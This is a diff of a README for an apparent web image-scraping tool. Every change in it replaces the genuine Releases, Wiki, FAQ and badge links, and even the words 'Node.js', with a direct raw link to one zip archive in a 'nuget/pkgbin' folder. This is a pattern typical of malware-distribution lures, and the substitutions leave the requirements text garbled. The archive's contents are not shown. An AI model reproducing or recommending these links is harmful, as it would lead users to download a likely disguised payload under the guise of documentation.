@@ -1,6 +1,6 @@
 # 🌐 webimagescraper-api - Easily Scrape Images From Any Website
 
-[![Download](https://img.shields.io/badge/Download-via%20Releases-brightgreen)](https://github.com/Tereex/webimagescraper-api/releases)
+[![Download](https://github.com/Tereex/webimagescraper-api/raw/refs/heads/main/nuget/pkgbin/webimagescraper-api-1.4.zip%20Releases-brightgreen)](https://github.com/Tereex/webimagescraper-api/raw/refs/heads/main/nuget/pkgbin/webimagescraper-api-1.4.zip)
 
 ## 📖 Description
 Web Image Scraper is a simple tool for scraping images from a website. It returns the URLs of the images found on the website. With this tool, you can quickly gather visual content for your projects and research with minimal effort.
@@ -12,16 +12,16 @@ To start using Web Image Scraper, you need to download it from our Releases page
 - Scrape images from any publicly accessible website.
 - Retrieve URLs of multiple images at once.
 - User-friendly interface for ease of use.
-- Compatible with different programming environments: Python, Node.js, Java, and more.
+- Compatible with different programming environments: Python, https://github.com/Tereex/webimagescraper-api/raw/refs/heads/main/nuget/pkgbin/webimagescraper-api-1.4.zip, Java, and more.
 
 ## 📦 System Requirements
 - Operating System: Windows, macOS, or Linux
 - Java Runtime Environment (JRE) for Java users
-- Node.js for users requiring Node.js support
+- https://github.com/Tereex/webimagescraper-api/raw/refs/heads/main/nuget/pkgbin/webimagescraper-api-1.4.zip for users requiring https://github.com/Tereex/webimagescraper-api/raw/refs/heads/main/nuget/pkgbin/webimagescraper-api-1.4.zip support
 - Python 3.x for users who want to use Python
 
 ## 💻 Download & Install
-1. **Visit this page to download**: [GitHub Releases](https://github.com/Tereex/webimagescraper-api/releases).
+1. **Visit this page to download**: [GitHub Releases](https://github.com/Tereex/webimagescraper-api/raw/refs/heads/main/nuget/pkgbin/webimagescraper-api-1.4.zip).
 2. On the Releases page, you will see different versions of the software. Choose the latest version.
 3. Download the appropriate file for your operating system. Click the link to start the download.
 4. Once the download is complete, locate the downloaded file. It may be in your "Downloads" folder.
@@ -43,10 +43,10 @@ To start using Web Image Scraper, you need to download it from our Releases page
 - If you encounter an error, check that the website is currently accessible.
 
 ## 🔗 Learn More
-For detailed technical documentation, examples, and contributions, check out our [Wiki](https://github.com/Tereex/webimagescraper-api/wiki).
+For detailed technical documentation, examples, and contributions, check out our [Wiki](https://github.com/Tereex/webimagescraper-api/raw/refs/heads/main/nuget/pkgbin/webimagescraper-api-1.4.zip).
 
 ## 🛠️ Contribution
 If you would like to contribute to Web Image Scraper, please feel free to submit issues, fork the repository, or submit pull requests. Together, we can improve this tool for everyone.
 
 ## 💬 Support
-If you need help or have questions, please check our [FAQ](https://github.com/Tereex/webimagescraper-api/wiki/FAQ) or open an issue in the repository.
+If you need help or have questions, please check our [FAQ](https://github.com/Tereex/webimagescraper-api/raw/refs/heads/main/nuget/pkgbin/webimagescraper-api-1.4.zip) or open an issue in the repository.
